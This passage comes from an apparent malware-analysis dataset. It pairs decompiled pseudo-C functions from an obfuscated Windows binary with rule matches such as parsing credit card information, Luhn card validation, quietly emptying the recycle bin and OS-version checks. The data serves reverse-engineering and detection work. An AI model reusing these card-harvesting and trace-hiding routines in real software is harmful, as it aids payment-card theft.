puVar5 & 0xffffU) - 1;\n    }\n    else {\n        uVar7 = iVar6 - puVar5;\n    }\n    iVar6 = uVar7 + param_2;\n    *param_4 = iVar6;\n    if ((CARRY4(uVar7, param_2) || iVar6 == 0) || (!CARRY4(uVar7, param_2) && iVar6 != 0)) {\n        *param_3 = *(iVar4 + 0x58);\n        puVar5 = param_3;\n    }\n    puVar1 = iVar4 + -0x75;\n    puVar2 = *puVar1;\n    *puVar1 = *puVar1 - &stack0xfffffff0;\n    *(param_2 + 0x1895847) = *(param_2 + 0x1895847) + puVar5 + (puVar2 < &stack0xfffffff0);\n    return CONCAT44(param_4, iVar4);\n}\n",
        "token_count": 549
    },
    "00402b60": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402c6e) overlaps instruction at (ram,0x00402c6b)\n// \n\nuint __cdecl fcn.00402b60(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint8_t extraout_DL;\n    uint *arg_20h;\n    uchar *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    uchar auStackY256 [168];\n    uint uStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint var_1fh;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar11 = fcn.00402d30(arg_18h, arg_1ch, 0x411058, 7);\n    if (uVar11 == 0) {\n        return 0;\n    }\n    puVar6 = &fcn.00402b60::var_1fh;\n    for (iVar4 = 7; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    bVar8 = false;\n    puVar6 = NULL;\n    bVar9 = true;\n    puVar7 = _sym.imp.MSVCRT.dll_rand;\n    do {\n        arg_20h = uVar11;\n        if (bVar8 || bVar9) {\ncode_r0x00402c30:\n            uVar12 = (*puVar7)();\n        }\n        else {\n            if (!bVar8 && !bVar9) goto code_r0x00402c30;\n            *puVar7 = *puVar6;\n            arg_20h = arg_20h & 0xffff0000 | CONCAT11(0xdf, uVar11);\n            puVar5 = 0xffe181d0;\n            uVar12 = uVar11 & 0xffffffff00000000 | &stack0xffffff00 | *(arg_20h + (&stack0xffffffd0 & 0xff));\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        uVar11 = uVar12 & 0xffffffff00000000 | ZEXT48(arg_20h);\n        uVar2 = uVar12 & 0x800000ff;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xffffff00) + 1;\n        }\n        (puVar5 + -0x20)[puVar6] = uVar2;\n        puVar6 = puVar6 + 1;\n        bVar8 = puVar6 < 0x20;\n        bVar9 = puVar6 == 0x20;\n        if (!bVar8) {\n            bVar8 = false;\n            bVar10 = false;\n            bVar9 = ((CONCAT11(uVar2 >> 8 & uVar12 >> 0x28, uVar2) * 2 | uVar12 >> 0x20) ^ 0x6c00) == arg_20h;\n            puVar6 = puVar5 + -0x20;\n            puVar7 = arg_20h;\n            for (iVar4 = 8; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = *puVar6;\n                puVar6 = puVar6 + 1;\n                puVar7 = puVar7 + 1;\n            }\n            if (bVar9) goto code_r0x00402c82;\n            while( true ) {\n                if (bVar8 || bVar9) {\n                    bVar10 = SBORROW4(&stack0xffffffd4, 1);\n                    bVar9 = *0x10 == 0x30;\n                }\ncode_r0x00402c82:\n                uStackY80 = 0x402c9e;\n                pcVar3 = fcn.00402470(*(puVar5 + 8), *(puVar5 + 0xc), *(puVar5 + 0x10), *(puVar5 + 0x14), puVar5 + -0x20\n                                      , 0x20, arg_20h);\n                if ((bVar8 || bVar9) || (!bVar8 && !bVar9)) break;\n                if (!bVar10) {\n    // WARNING: Bad instruction - Truncating control flow here\n                    halt_baddata();\n                }\n                *pcVar3 = *pcVar3 + pcVar3;\n                puVar1 = pcVar3 + 0x58;\n                bVar8 = CARRY1(*puVar1, extraout_DL);\n                bVar10 = SCARRY1(*puVar1, extraout_DL);\n                *puVar1 = *puVar1 + extraout_DL;\n                bVar9 = *puVar1 == 0;\n            }\n            uStackY80 = *(puVar5 + 0x1c);\n            uStackY84 = *(puVar5 + 0x18);\n            uStackY88 = 0x402ccd;\n            fcn.00404f90();\n            return 1;\n        }\n    } while( true );\n}\n",
        "token_count": 1275
    },
    "004033b0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004033fa) overlaps instruction at (ram,0x004033f9)\n// \n\nuint fcn.004033b0(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int32_t arg_8h;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int16_t extraout_CX;\n    int16_t iVar5;\n    uint8_t *puVar6;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    bool bVar7;\n    ulong uVar8;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    \n    uVar2 = CONCAT44(param_3, param_2);\n    uStack12 = 0;\n    uStack16 = 0x80;\n    uStack20 = 2;\n    uStack24 = 0;\n    uStack28 = 1;\n    uStack32 = 0x40000000;\n    uStack36 = param_1;\n    uVar8 = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    arg_8h = uVar8;\n    bVar7 = arg_8h == -1;\n    if (bVar7) {\n        return 0;\n    }\n    if ((bVar7) || (!bVar7)) {\n        iVar5 = *0x10 + 4;\n    }\n    else {\n        uVar1 = in(uVar8 >> 0x20);\n        *unaff_EDI = uVar1;\n        iVar5 = extraout_CX;\n        uVar2 = uVar8;\n        if (&uStack36 < 1) goto code_r0x00403464;\n    }\n    puVar6 = uVar2 >> 0x20;\n    uVar3 = uVar2 ^ 0xdee0ed6d;\n    *(unaff_EBX + 0x458b1055) = *(unaff_EBX + 0x458b1055) ^ iVar5;\n    *puVar6 = *puVar6 | iVar5 >> 8;\n    iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h, uVar3 & 0xffff0000 | uVar3 + (uVar3 >> 8) * -0x31 | 0x8d);\n    if (iVar4 == 0) {\n        return 0;\n    }\n    if (*0x4224b8 != 0) {\n        iVar4 = fcn.004032d0(arg_8h);\n        *0x4224b8 = iVar4 == 0;\n    }\n    fcn.00403530(0, arg_8h);\n    if ((&stack0xffffffd3 < 0xfffffff8 && *0x10 != 0x25) && (&stack0xffffffd3 >= 0xfffffff8 || *0x10 == 0x25)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\ncode_r0x00403464:\n    if (*0x4224b8 == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 1;\n}\n",
        "token_count": 747
    },
    "00404500": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004045c1) overlaps instruction at (ram,0x004045c0)\n// \n// WARNING: Removing unreachable block (ram,0x00404543)\n// WARNING: Removing unreachable block (ram,0x00404545)\n// WARNING: Removing unreachable block (ram,0x0040454b)\n// WARNING: Removing unreachable block (ram,0x004045b1)\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00404500(void)\n\n{\n    int32_t iVar1;\n    char extraout_DH;\n    uint32_t unaff_EBX;\n    char *pcVar2;\n    int32_t *unaff_EDI;\n    uint *puVar3;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00404480();\n    if (iVar1 == 0) {\n        return false;\n    }\n    if ((-1 < iVar1) && (-1 >= iVar1)) {\n        out(0xc4, iVar1);\n        *unaff_EDI = iVar1;\n    }\n    fcn.00404bc0();\n    iVar1 = fcn.004031e0(0x411078);\n    if (iVar1 != -1) {\n        return false;\n    }\n    fcn.00401900();\n    *0x4224bc = 1;\n    iVar1 = fcn.004047f0();\n    if (iVar1 != 0) {\n        return false;\n    }\n    var_20h = 0;\n    pcVar2 = unaff_EBX & 0xffff0000 | CONCAT11(*0x7, unaff_EBX);\n    *0x7b9d232 = *0x7b9d232 + '2';\n    *pcVar2 = *pcVar2 + extraout_DH;\n    var_80h._0_1_ = 0;\n    puVar3 = &var_1fh;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0x7b9d232;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0xd232;\n    *(puVar3 + 2) = 0x32;\n    puVar3 = &var_80h + 1;\n    var_60h._0_1_ = var_80h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    puVar3 = &var_60h + 1;\n    var_40h._0_1_ = var_80h;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    puVar3 = &var_40h + 1;\n    for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar1 = fcn.00402750(&var_80h, &var_60h, &var_20h, &var_40h);\n    if (iVar1 == 0) {\n        return false;\n    }\n    iVar1 = fcn.004028a0(&var_20h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.00404830(&var_80h, &var_60h, &var_20h, &var_40h);\n        return iVar1 != 0;\n    }\n    return false;\n}\n",
        "token_count": 939
    },
    "00401900": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401c1f) overlaps instruction at (ram,0x00401c1e)\n// \n\nvoid __fastcall fcn.00401900(char *param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    char *pcVar3;\n    uint8_t uVar4;\n    int16_t iVar5;\n    int32_t in_EAX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint8_t extraout_AH;\n    uint32_t uVar8;\n    ushort uVar9;\n    uint16_t extraout_CX;\n    char *extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EBP;\n    int32_t unaff_ESI;\n    uint unaff_EDI;\n    uint8_t *puVar10;\n    ushort in_SS;\n    bool bVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    char in_SF;\n    char cVar13;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char in_OF;\n    uchar uVar14;\n    char cVar15;\n    bool bVar16;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    ulong uVar17;\n    uint64_t uVar18;\n    uint in_stack_ffffffc8;\n    uint arg_14h;\n    ushort uVar19;\n    ushort uVar20;\n    ushort uVar21;\n    ushort in_stack_ffffffec;\n    ushort in_stack_ffffffee;\n    ushort in_stack_fffffff0;\n    \n    if ((in_OF == in_SF) && (uVar9 = SUB42(param_1, 0),  in_OF != in_SF)) {\n        puVar1 = unaff_ESI + 0x14;\n        uVar6 = *puVar1;\n        *puVar1 = *puVar1 + unaff_EBP;\n        *param_1 = *param_1 + unaff_ESI + CARRY4(uVar6, unaff_EBP);\n        unaff_ESI = in_EAX;\n    }\n    else {\n        in_stack_fffffff0 = 0x11;\n        uVar9 = 0;\n        in_stack_ffffffec = 0x1014;\n        in_stack_ffffffee = 0x41;\n    }\n    uVar6 = int.00401f30(0x411494, 0x11, CONCAT22(in_stack_ffffffee, in_stack_ffffffec), \n                         CONCAT22(uVar9, in_stack_fffffff0));\n    bVar11 = uVar6 < 0x6e32;\n    bVar12 = uVar6 == 0x6e32;\n    uVar6 = int.00401f30(0x411494, 0x11, 0x411230, 0xf);\n    if ((bVar12) || (!bVar12)) {\ncode_r0x00401977:\n        uVar9 = 0x1240;\n        uVar19 = 0x41;\n        int.00401f30(0x411494, 0x11, 0x411240, 0x1a);\n        bVar11 = (POPCOUNT(unaff_EBX & extraout_CX & 0xff) & 1U) == 0;\n        unaff_EBX = unaff_EBX & 0xffff;\n        int.00401f30(0x411494, 0x11, 0x411294, 10);\n        if (!bVar11) {\n            uVar20 = unaff_EDI;\n            uVar21 = unaff_EDI >> 0x10;\n            if (bVar11) {\n                unaff_ESI = 0x34a96cf4;\n                unaff_EBP = *0x6a17b43a | *(extraout_EDX + -0x5f);\n                goto code_r0x004019c3;\n            }\n        }\n    }\n    else {\n        unaff_EBX = unaff_EBX + 1;\n        if (!bVar11 && unaff_EBX != 0) {\n            in_AF = 9 < (uVar6 & 0xf) | in_AF;\n            piVar2 = (uVar6 & 0xffff0000 | CONCAT11((uVar6 >> 8) + in_AF, uVar6 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar2 = *piVar2 - unaff_EBX;\n            unaff_ESI = unaff_ESI + 1;\n            goto code_r0x00401977;\n        }\n    }\n    uVar20 = 0xb;\n    uVar21 = 0;\n    uVar9 = 0x12a0;\n    uVar19 = 0x41;\ncode_r0x004019c3:\n    int.00401f30(0x411494, 0x11, CONCAT22(uVar19, uVar9), CONCAT22(uVar21, uVar20));\n    int.00401f30(0x411494, 0x11, 0x4112ac, 8);\n    bVar11 = false;\n    uVar9 = 0x1a26;\n    uVar19 = 0x40;\n    int.00401f30(0x411494, 0x11, 0x4112b4, 9);\n    if ((bVar11) || (!bVar11)) {\n        uVar9 = 9;\n        uVar19 = 0;\n    }\n    uVar20 = 0x41;\n    int.00401f30(0x411494, 0x11, 0x4112c0, CONCAT22(uVar19, uVar9));\n    int.00401f30(0x411494, 0x11, 0x4112cc, 9);\n    bVar11 = false;\n    uVar14 = 0;\n    uVar6 = 0x411494;\n    uVar17 = int.00401f30(0x411494, 0x11, 0x4112d8, 0x47);\n    arg_14h = uVar17 >> 0x20;\n    if ((bVar11) || (!bVar11)) {\n        arg_14h = 3;\n        in_stack_ffffffc8 = 0x4112e4;\n    }\n    else {\n        iVar7 = uVar17 + 0x7c8ecb0d + (bVar11 == false);\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n        cVar13 = iVar7;\n        uVar14 = SCARRY1(cVar13, *extraout_ECX) != SCARRY1(cVar13 + *extraout_ECX, CARRY4(unaff_EBP, *(iVar7 + -0x1c)));\n    }\n    int.00401f30(0x411494, 0x11, in_stack_ffffffc8, arg_14h);\n    if ((!uVar14) && (uVar14)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar5 = int.00401f30(0x411494, 0x11, 0x4112e8, 10);\n    cVar15 = '\\0';\n    cVar13 = (iVar5 + unaff_EBX | 0x11a9U) < 0;\n    uVar18 = int.00401f30(0x411494, 0x11, 0x4112f4, 0x40);\n    uVar8 = extraout_ECX_00;\n    if (cVar15 == cVar13) {\n        uVar8 = extraout_ECX_00 & 0xffff;\n    }\n    while( true ) {\n        pcVar3 = (uVar18 >> 0x20) + 0x11;\n        *pcVar3 = *pcVar3 + (uVar8 + 1 >> 8);\n        int.00401f30(0x411494, in_stack_ffffffc8, arg_14h, uVar6);\n        int.00401f30(0x411494, 0x11, 0x411340, 0xb);\n        int.00401f30(0x411494, 0x11, 0x41134c, 4);\n        int.00401f30(0x411494, 0x11, 0x411350, 4);\n        int.00401f30(0x411494, 0x11, str._k, 0xc);\n        int.00401f30(0x411494, 0x11, 0x411360, 4);\n        bVar11 = false;\n        bVar16 = false;\n        bVar12 = ((unaff_EBX & 0xffff & 0xff00 | unaff_EBX & 0xffff | extraout_AH) & 0x94f) == 0;\n        uVar6 = 0x401c4f;\n        uVar8 = int.00401f30(0x411494, 0x11, 0x411364, 9);\n        if ((bVar11 || bVar12) || (uVar6 = uVar6 & 0xffff | uVar18 << 0x10,  !bVar11 && !bVar12)) break;\n        if (!bVar16) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar18 = CONCAT44(*(uVar8 | 0x83000003), uVar8) | 0x83000003;\n        uVar8 = extraout_ECX_01;\n    }\n    uVar6 = 0x401c84;\n    uVar4 = int.00401f30(0x411494, 0x11, 0x411370, 0x16);\n    if ((bVar11) || (uVar6 = uVar6 & 0xffff | CONCAT22(uVar20, in_SS) << 0x10,  !bVar11)) {\n        uVar6 = 7;\n    }\n    puVar10 = CONCAT22(uVar20, in_SS);\n    cVar13 = uVar4 - *puVar10;\n    uVar8 = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *puVar10) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n            (cVar13 < '\\0') * 0x80 | (cVar13 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar13) & 1U) == 0) * 4 |\n            uVar4 < *puVar10 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n            (in_AC & 1) * 0x40000;\n    func_0x10187c0e(uVar8, uVar6);\n    int.00401f30(0x411494, 0x11, 0x411388, uVar8);\n    return;\n}\n",
        "token_count": 2642
    },
    "00403980": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004039c5) overlaps instruction at (ram,0x004039bc)\n// \n// WARNING: Removing unreachable block (ram,0x004039b6)\n\nbool fcn.00403980(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack276;\n    uint uStack275;\n    uchar *puStack16;\n    uint uStack8;\n    \n    uStack276 = 0;\n    uStack8 = 0x104;\n    puVar2 = &uStack275;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)();\n    if (iVar1 != 0) {\n        return false;\n    }\n    puStack16 = (*_sym.imp.MSVCRT.dll_strchr)(&uStack276, 0x2e);\n    if (puStack16 == NULL) {\n        return false;\n    }\n    *puStack16 = 0;\n    iVar1 = (*_sym.imp.MSVCRT.dll_atoi)(&uStack276);\n    if (iVar1 != 6) {\n        return iVar1 == 7;\n    }\n    return true;\n}\n",
        "token_count": 328
    },
    "00403480": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040350e) overlaps instruction at (ram,0x0040350d)\n// \n\nint32_t __cdecl fcn.00403480(uint32_t arg_8h, uint16_t *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    if (arg_10h != NULL) {\n        do {\n            arg_8h = arg_8h + *arg_ch;\n            bVar4 = arg_8h >> 0x10 != 0;\n            if (bVar4) {\n                if ((bVar4) && (!bVar4)) {\n                    uVar1 = in(arg_ch);\n                    *arg_10h = uVar1;\n                    arg_10h = arg_10h + 1;\n                    if (&stack0xfffffff0 < 1) {\n    // WARNING: Could not recover jumptable at 0x00403578. Too many branches\n    // WARNING: Treating indirect jump as call\n                        iVar3 = (**((arg_8h >> 0x10) + 4))();\n                        return iVar3;\n                    }\n                }\n                uVar2 = arg_8h >> 0x10 ^ 0xdee0ed6d;\n                arg_8h = (uVar2 & 0xffff0000 | uVar2 + (uVar2 >> 8) * -0x31) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != NULL);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 401
    },
    "004020e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004020e0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00402dd0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x407010;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 218
    },
    "00402420": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00402420(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403880(0x80000002, 0x4111dc, 0x411228, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 131
    },
    "00402e90": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ef6) overlaps instruction at (ram,0x00402ef3)\n// \n\nuint __cdecl fcn.00402e90(char *arg_8h, char *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *unaff_ESI;\n    uint32_t uVar4;\n    uint *puVar5;\n    code *pcVar6;\n    char *pcVar7;\n    uint16_t in_SS;\n    bool bVar8;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar8 = arg_ch != NULL;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    uVar4 = bVar8;\n    if ((!bVar8) || (bVar8)) {\n        arg_ch = &var_160h;\n        unaff_ESI = arg_8h;\n        pcVar6 = _sym.imp.MSVCRT.dll_sprintf;\n    }\n    else {\n        *(uVar4 + 0x4060e43d) = *(uVar4 + 0x4060e43d);\n        unaff_ESI[-0x73] = unaff_ESI[-0x73] + '\\x01';\n        pcVar6 = in_SS;\n    }\n    (*pcVar6)(arg_ch);\n    (*pcVar6)(&var_264h, 0x4110a8, unaff_ESI);\n    pcVar6 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar3 = 0xffffffff;\n    pcVar7 = &var_160h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar3 - 1;\n    uVar3 = 0xffffffff;\n    pcVar7 = unaff_ESI;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4110d0;\n    var_30h = 0x4110dc;\n    var_2ch = 0x4110e8;\n    var_28h = 0x4110f8;\n    var_24h = 0x411100;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = unaff_ESI;\n    var_44h = ~uVar3 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if (uVar4 < 5) {\n        uVar4 = uVar4 * 4;\n        do {\n            iVar2 = (*pcVar6)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar2 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1248
    },
    "004032d0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032f9) overlaps instruction at (ram,0x004032f8)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004032f9)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004032d0(uint arg_8h)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    uint var_4h;\n    \n    if (in_OF == in_SF) {\n        if (in_OF != in_SF) {\n            out(0xc4, in_EAX);\n            *unaff_EDI = in_EAX;\n        }\n    }\n    iVar1 = fcn.004031e0(0x411080);\n    // WARNING: Bad instruction - Truncating control flow here\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x40, 0, iVar1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n    iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n    if (iVar3 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 372
    },
    "00403a70": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403b0f) overlaps instruction at (ram,0x00403b0b)\n// \n\nbool __cdecl fcn.00403a70(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    code *pcVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint8_t in_AF;\n    unkbyte10 extraout_ST0;\n    ulong uVar11;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(arg_8h);\n    var_14h = 0x411444;\n    var_10h = 0x41143c;\n    var_ch = 0x41144c;\n    var_8h = 0x411454;\n    var_4h = 0x41145c;\n    puVar10 = &var_14h;\n    uVar8 = 0;\n    do {\n        uVar11 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, *puVar10);\n        puVar7 = uVar11 >> 0x20;\n        if (uVar11 != 0) {\n            return true;\n        }\n        uVar9 = uVar8 + 1;\n        puVar10 = puVar10 + 1;\n        iVar3 = uVar8 - 4;\n        uVar8 = uVar9;\n    } while (uVar9 < 5);\n    if ((uVar9 < 5) || (SBORROW4(uVar9, 5) == iVar3 < 0)) {\n        pcVar5 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h, 0x411434);\n    }\n    else {\n        uVar4 = (in_AF | 1) * '\\x06' - 1;\n        uVar8 = *puVar7;\n        *0x8316dbec = extraout_ST0;\n        *puVar7 = *puVar7 + 0x3468df84;\n        puVar1 = arg_8h + -1;\n        uVar2 = *puVar1;\n        uVar6 = uVar11 >> 0x20;\n        *puVar1 = *puVar1 + uVar6;\n        pcVar5 = sym.imp.MSVCRT.dll_strstr +\n                 CARRY1(uVar2, uVar6) +\n                 (uVar4 + (0x90 < (uVar4 & 0xf0) | uVar9 < 5 | (in_AF | 1) * (0xf9 < uVar4)) * '`' + 'A' +\n                  (0xcb97207b < uVar8) | 0xffffff00);\n    }\n    return pcVar5 == NULL;\n}\n",
        "token_count": 694
    },
